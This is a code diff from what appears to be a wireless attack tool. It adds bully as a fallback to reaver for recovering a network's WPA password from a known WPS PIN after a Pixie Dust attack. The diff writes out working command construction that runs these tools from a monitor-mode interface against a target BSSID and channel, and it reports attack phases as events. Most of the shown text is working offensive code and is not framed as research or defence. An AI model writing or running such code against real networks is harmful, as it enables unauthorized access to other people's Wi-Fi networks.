@@ -136,7 +136,8 @@ def pixie(mon, target, req, emit, stop_flag):
         emit(AttackEvent(EventType.PHASE, essid=essid, bssid=bssid,
                          phase="GETPSK", countdown=90, cd_max=90,
                          signal=target.get("signal")))
-        psk = _recover_psk(mon, target, pin, emit, essid, bssid, stop_flag)
+        psk = _recover_psk(mon, target, pin, emit, essid, bssid, stop_flag,
+                           tool=tool)
 
     if psk is not None or pin:
         # PSK = the Wi-Fi password (connectable). PIN alone = not connectable yet.
@@ -156,28 +157,43 @@ def recover_psk(iface, target, pin, emit, stop_flag=None, timeout=90):
     essid = target.get("essid") or target.get("bssid")
     bssid = target.get("bssid")
     name = iface_mod.iface_name(iface)
-    if not tools.tool_ok(tools.REAVER):
+    tool = "bully" if (not tools.tool_ok(tools.REAVER)
+                       and tools.tool_ok(tools.BULLY)) else "reaver"
+    bin_path = tools.BULLY if tool == "bully" else tools.REAVER
+    if not tools.tool_ok(bin_path):
         emit(AttackEvent(EventType.FAILED, essid=essid, bssid=bssid,
-                         detail="reaver missing"))
+                         detail="%s missing" % tool))
         return None
     try:
         with iface_mod.monitor_mode(name) as mon:
             return _recover_psk(mon, target, pin, emit, essid, bssid,
-                                stop_flag, timeout=timeout)
+                                stop_flag, timeout=timeout, tool=tool)
     except RuntimeError as e:
         emit(AttackEvent(EventType.FAILED, essid=essid, bssid=bssid,
                          detail=str(e)[:20]))
         return None
 
 
-def _recover_psk(mon, target, pin, emit, essid, bssid, stop_flag, timeout=90):
-    """Recover the WPA PSK from a known WPS PIN: `reaver -p <pin>` does one WPS
-    registration and prints the PSK. Returns the PSK string or None."""
-    if not tools.tool_ok(tools.REAVER):
+def _recover_psk(mon, target, pin, emit, essid, bssid, stop_flag, timeout=90,
+                 tool="reaver"):
+    """Recover the WPA PSK from a known WPS PIN: `-p <pin>` does one WPS
+    registration and prints the PSK. Uses whichever tool found the PIN (reaver
+    or bully) — a pixie run with one shouldn't silently fail to fetch the PSK
+    just because the other isn't installed. Returns the PSK string or None."""
+    bin_path = tools.BULLY if tool == "bully" else tools.REAVER
+    if not tools.tool_ok(bin_path):
+        emit(AttackEvent(EventType.FAILED, essid=essid, bssid=bssid,
+                         detail="%s missing" % tool))
         return None
-    cmd = [tools.REAVER, "-i", mon, "-b", bssid, "-p", str(pin), "-vv"]
-    if target.get("channel"):
-        cmd += ["-c", str(target["channel"])]
+    if tool == "bully":
+        cmd = [tools.BULLY, "-b", bssid, "-p", str(pin), "-d", "-v", "3"]
+        if target.get("channel"):
+            cmd += ["-c", str(target["channel"])]
+        cmd.append(mon)
+    else:
+        cmd = [tools.REAVER, "-i", mon, "-b", bssid, "-p", str(pin), "-vv"]
+        if target.get("channel"):
+            cmd += ["-c", str(target["channel"])]
     tools.log("wps psk-recover: %s" % " ".join(cmd))
     try:
         proc = subprocess.Popen(cmd, stdout=subprocess.PIPE,
